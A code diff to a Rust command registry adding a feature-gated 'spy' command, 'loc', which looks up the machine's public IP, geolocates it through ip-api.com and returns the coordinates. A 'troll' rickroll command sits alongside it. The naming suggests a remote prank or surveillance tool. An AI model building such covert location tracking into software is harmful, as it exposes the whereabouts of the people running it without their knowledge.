@@ -1,12 +1,13 @@
 use std::collections::HashMap;
-#[cfg(feature = "troll")]
-mod troll {
-    pub use open;
-    pub use rand::Rng;
-}
+pub use rand::Rng;
 
 #[cfg(feature = "troll")]
-use troll::*;
+pub use open;
+
+#[cfg(feature = "spy")]
+use serde::Deserialize;
+#[cfg(feature = "spy")]
+use reqwest::blocking::get;
 
 pub struct Media {
     pub name: String,
@@ -159,6 +160,58 @@ fn rickroll(_args: Args, out: OutFun) {
     text_output!(out, format!("Opened url: {}", url));
 }
 
+#[cfg(feature = "spy")]
+fn location(_args: Args, out: OutFun) {
+    use crate::utils;
+
+    text_output!(out, "Getting public IP address");
+
+    let ip_address = match utils::get_public_ip() {
+        Ok(ip) => ip,
+        Err(err) => {
+            text_output!(out, format!("Error getting public IP address: {}", err));
+            return;
+        }
+    };
+
+    let url = format!("http://ip-api.com/json/{}", ip_address);
+
+    text_output!(out, format!("Sending request to {}", url));
+
+    #[derive(Debug, Deserialize)]
+    struct Geolocation {
+        lat: f64,
+        lon: f64,
+    }
+
+    let response = match get(&url) {
+        Ok(response) => response,
+        Err(err) => {
+            text_output!(out, format!("{:?}", err));
+            return;
+        }
+    };
+    let geolocation: Geolocation = match response.json() {
+        Ok(data) => data,
+        Err(err) => {
+            text_output!(out, format!("Error parsing JSON: {:?}", err));
+            return;
+        }
+    };
+
+    text_output!(
+        out,
+        format!(
+            "Latitude: {}\nLongitude: {}\nCOORDS: {}, {}",
+            geolocation.lat,
+            geolocation.lon,
+            geolocation.lat,
+            geolocation.lon
+        )
+    );
+}
+
+// Registry initializer
 pub fn init(out: OutFun) -> Registry {
     let mut reg = Registry::new(out);
 
@@ -167,10 +220,13 @@ pub fn init(out: OutFun) -> Registry {
     reg.enter("exit", quit);
     #[cfg(feature = "troll")]
     reg.enter("rickroll", rickroll);
+    #[cfg(feature = "spy")]
+    reg.enter("loc", location);
 
     return reg;
 }
 
+// Tests
 #[cfg(test)]
 mod tests {
     use super::Command;
